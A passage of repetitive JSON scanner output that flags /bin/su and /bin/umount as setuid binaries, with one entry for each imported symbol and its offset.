                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ce0, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ce8, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cf0, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cf8, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d00, Symbol: pam_strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d08, Symbol: errx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d10, Symbol: dup2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d18, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d20, Symbol: warnx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d28, Symbol: nanosleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d30, Symbol: dup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d38, Symbol: gettimeofday, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d40, Symbol: pam_getenvlist, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d48, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d50, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d58, Symbol: __strtoul_internal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d60, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d68, Symbol: setusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d70, Symbol: signalfd, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d78, Symbol: ioctl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d80, Symbol: updwtmpx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d88, Symbol: fgetc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d90, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d98, Symbol: setgroups, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011da0, Symbol: setsid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011da8, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011db0, Symbol: misc_conv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011db8, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011dc0, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011dc8, Symbol: getusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011dd0, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011dd8, Symbol: strndup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011de0, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011de8, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011df0, Symbol: putenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011df8, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e00, Symbol: sigemptyset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e08, Symbol: basename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e10, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e18, Symbol: sigfillset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e20, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e28, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e30, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e38, Symbol: openpty, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e40, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e48, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e50, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e58, Symbol: err, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e60, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e68, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e70, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e78, Symbol: pam_close_session, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e80, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e88, Symbol: getegid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e90, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e98, Symbol: strsignal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ea0, Symbol: ttyname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ea8, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011eb0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011eb8, Symbol: cfmakeraw, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ec0, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ec8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ed0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ed8, Symbol: poll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ee0, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ee8, Symbol: setgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ef0, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ef8, Symbol: tcgetattr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f00, Symbol: tcsetattr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f08, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f10, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f18, Symbol: dcngettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f20, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f28, Symbol: execvp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f30, Symbol: __cxa_atexit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f38, Symbol: sysinfo, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f40, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f48, Symbol: getgrnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f50, Symbol: pam_acct_mgmt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f58, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f60, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f68, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f70, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f78, Symbol: pam_setcred, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f80, Symbol: pam_authenticate, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f88, Symbol: pam_open_session, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f90, Symbol: initgroups, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f98, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fa0, Symbol: endusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fa8, Symbol: sigaddset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fb0, Symbol: execv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fb8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fc0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fc8, Symbol: __sprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fd0, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fd8, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fe0, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fe8, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ff0, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012020, Symbol: __progname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012028, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012030, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012040, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012060, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c60, Symbol: mnt_table_set_parser_errcb, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c68, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c70, Symbol: mnt_context_is_restricted, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c78, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c80, Symbol: mnt_unref_table, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c88, Symbol: mnt_context_next_umount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c90, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c98, Symbol: mnt_context_helper_executed, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ca0, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ca8, Symbol: _exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cb0, Symbol: secure_getenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cb8, Symbol: mnt_context_enable_fake, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cc0, Symbol: warn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cc8, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cd0, Symbol: mnt_context_switch_ns, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cd8, Symbol: mnt_table_next_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ce0, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ce8, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cf0, Symbol: mnt_new_iter, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cf8, Symbol: mnt_context_get_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d00, Symbol: mnt_context_disable_swapmatch, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d08, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d10, Symbol: mnt_context_find_umount_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d18, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d20, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d28, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d30, Symbol: mnt_get_library_features, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d38, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d40, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d48, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d50, Symbol: errx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d58, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d60, Symbol: warnx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d68, Symbol: mnt_context_force_unrestricted, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d70, Symbol: mnt_context_umount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d78, Symbol: nanosleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d80, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d88, Symbol: mnt_new_table, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d90, Symbol: dup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d98, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008da0, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008da8, Symbol: mnt_context_disable_helpers, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008db0, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008db8, Symbol: getcwd, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008dc0, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008dc8, Symbol: mnt_context_set_tables_errcb, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008dd0, Symbol: pipe, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008dd8, Symbol: mnt_new_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008de0, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008de8, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008df0, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008df8, Symbol: mnt_fs_get_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e00, Symbol: mnt_context_switch_target_ns, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e08, Symbol: mnt_fs_get_srcpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e10, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e18, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e20, Symbol: mnt_context_enable_loopdel, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e28, Symbol: mnt_context_tab_applied, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e30, Symbol: prctl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e38, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e40, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e48, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e50, Symbol: mnt_init_debug, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e58, Symbol: mnt_context_syscall_called, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e60, Symbol: err, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e68, Symbol: mnt_context_set_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e70, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e78, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e80, Symbol: mnt_context_get_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e88, Symbol: mnt_context_get_excode, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e90, Symbol: mnt_free_iter, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e98, Symbol: mnt_context_is_verbose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ea0, Symbol: mnt_context_set_target_ns, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ea8, Symbol: getegid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008eb0, Symbol: mnt_table_set_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008eb8, Symbol: mnt_context_enable_lazy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ec0, Symbol: mnt_table_find_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ec8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ed0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ed8, Symbol: mnt_context_enable_force, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ee0, Symbol: mnt_fs_get_devno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ee8, Symbol: mnt_context_get_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ef0, Symbol: mnt_get_library_version, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ef8, Symbol: mnt_reset_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f00, Symbol: memmove, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f08, Symbol: setgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f10, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f18, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f20, Symbol: mnt_context_enable_rdonly_umount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f28, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f30, Symbol: mnt_context_set_options_pattern, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f38, Symbol: mnt_free_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f40, Symbol: mnt_context_disable_canonicalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f48, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f50, Symbol: mnt_context_set_fstype_pattern, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f58, Symbol: __cxa_atexit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f60, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f68, Symbol: fwrite, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f70, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f78, Symbol: mnt_context_enable_verbose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f80, Symbol: mnt_table_next_child_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f88, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f90, Symbol: mnt_context_disable_mtab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f98, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fa0, Symbol: mnt_table_parse_file, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fa8, Symbol: mnt_tag_is_valid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fb0, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fb8, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fc0, Symbol: mnt_context_get_status, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fc8, Symbol: mnt_context_get_syscall_errno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fd0, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fd8, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fe0, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
